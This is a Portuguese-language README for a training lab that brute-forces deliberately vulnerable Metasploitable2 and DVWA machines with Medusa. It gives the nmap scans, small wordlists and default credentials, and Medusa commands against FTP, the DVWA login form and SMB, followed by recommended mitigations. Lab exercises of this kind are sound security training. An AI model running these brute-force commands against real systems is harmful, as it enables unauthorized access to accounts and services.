# Laborat-rio-de-Ataques-de-For-a-Bruta---Medusa
Repositório-modelo para o desafio: implementar, documentar e compartilhar um projeto prático usando Kali Linux e Medusa, com ambientes vulneráveis (Metasploitable2, DVWA) — para simular força bruta e documentar prevenção

# Objetivo do repositório #

-Montar um ambiente de laboratório com Kali Linux e Metasploitable 2 (e opcionalmente DVWA) usando VirtualBox.

-Executar ataques de força bruta controlados usando Medusa.

-Documentar comandos, wordlists, resultados e medidas de mitigação.

-Preparar um relatório final e elementos para compartilhamento no GitHub como portfólio técnico.

# Requisitos mínimos #

-VirtualBox instalado (versão moderna) e extensões guest additions se necessário.

-Imagens ISO/OVA: Kali Linux (última versão), Metasploitable 2 (OVA) e DVWA (se for usar).

-Máquina host com RAM e CPU suficientes para 2–3 VMs.

-Medusa instalado no Kali (apt update && apt install medusa).

-Ferramentas auxiliares: nmap, tcpdump, wireshark

# Configuração das VMs #

Veja lab-setup/virtualbox-setup.md para o passo a passo. Resumo:

-Criar duas VMs no VirtualBox: Kali e Metasploitable2.

-Ajustar rede para Host-only Adapter (ou Internal Network, conforme preferir). Isso garante isolamento.

-Iniciar Metasploitable2; anotar seu IP (ex: ip a).

-No Kali, confirmar conectividade ping (ex. ping 192.168.56.102).

-Credenciais por padrão 

(Metasploitable2):  msfadmin:msfadmin  

DVWA usa admin:password por padrão (se configurado assim).

# Passo a passo em resumo #
-Levante as VMs no VirtualBox e defina a rede como Host-only.

-Identifique o IP do alvo (ex.: 192.168.56.102) a partir do Metasploitable2/DVWA.

-Do Kali, confirme conectividade:

"ping -c 3 192.168.56.102"

-Enumere serviços com nmap:

nmap -sS -sV -p- --min-rate 1000 192.168.56.102

nmap -sV -p21,80,139,445 192.168.56.102

# Criaçao de um Wordlist #
-Crie um txt para ser usado de lista:

wordlists/small-usernames.txt

wordlists/small-passwords.txt

-small-usernames.txt
admin
msfadmin
user
test
guest

-small-passwords.txt
password
123456
admin
msfadmin
qwerty

# Usando Medusa | scripts #
-Força bruta em FTP 

medusa -h 192.168.56.102 -u msfadmin -P wordlists/small-passwords.txt -M ftp -f -t 8 -T 30

-Força bruta em formulário web

medusa -h 192.168.56.102 -M http -m POST:/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^ -U wordlists/small-usernames.txt -P wordlists/small-passwords.txt -t 8 -f

-Password spraying / brute-force em SMB

medusa -h 192.168.56.102 -M smbnt -U wordlists/small-usernames.txt -P wordlists/small-passwords.txt -t 4 -f
	
validar credenciais obtidas:
	smbclient -L //192.168.56.102 -U msfadmin%msfadmin

# Mitigações recomendadas #

-Implementar bloqueio de conta ou rate-limiting após múltiplas tentativas falhas.

-Habilitar autenticação multifator (MFA).

-Usar senhas fortes e políticas de gerenciamento (controle, rotação, detectores de senhas fracas).

-Implementar WAF / regras que bloqueiem padrões de brute force em formulários.

-Desabilitar protocolos inseguros (ex.: SMBv1) e segmentar redes internas.

# Observação final #

-As linhas de comando aqui usam 192.168.56.102 como exemplo. Substitua pelo IP real da sua máquina alvo no laboratório.
